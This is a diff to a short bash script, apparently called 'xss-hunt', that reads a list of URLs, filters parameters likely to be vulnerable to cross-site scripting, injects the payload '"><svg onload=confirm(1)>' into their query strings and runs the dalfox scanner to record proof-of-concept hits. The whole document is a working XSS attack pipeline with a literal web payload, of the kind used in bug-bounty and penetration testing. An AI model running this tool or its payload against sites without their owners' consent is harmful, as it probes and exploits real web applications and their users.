@@ -1,9 +1,22 @@
 #!/bin/bash
-# Usage: xss-hunt urls.txt
+set -euo pipefail
 
-if [ -z "$1" ]; then
-    echo "Usage: xss-hunt <urls.txt>"
-    exit 1
-fi
+[ $# -eq 0 ] && echo "Usage: xss-hunt <urls.txt>" && exit 1
+[ ! -f "$1" ] && echo "File not found: $1" && exit 1
 
-cat $1 | gf xss | uro | qsreplace '"><svg onload=confirm(1)>' | dalfox pipe --silence
+INPUT="$1"
+OUTPUT=~/reports/xss_$(date +%Y%m%d).txt
+CANDIDATES=$(mktemp)
+
+echo "Filtering XSS candidates..."
+cat "$INPUT" | gf xss | uro > "$CANDIDATES"
+COUNT=$(wc -l < "$CANDIDATES")
+
+[ $COUNT -eq 0 ] && echo "No candidates found" && rm "$CANDIDATES" && exit 0
+
+echo "Testing $COUNT candidates with dalfox..."
+cat "$CANDIDATES" | qsreplace '"><svg onload=confirm(1)>' | dalfox pipe --silence -o "$OUTPUT" 2>/dev/null
+rm "$CANDIDATES"
+
+FINDINGS=$(grep -c "POC" "$OUTPUT" 2>/dev/null || echo 0)
+echo "Found: $FINDINGS | Saved: $OUTPUT"
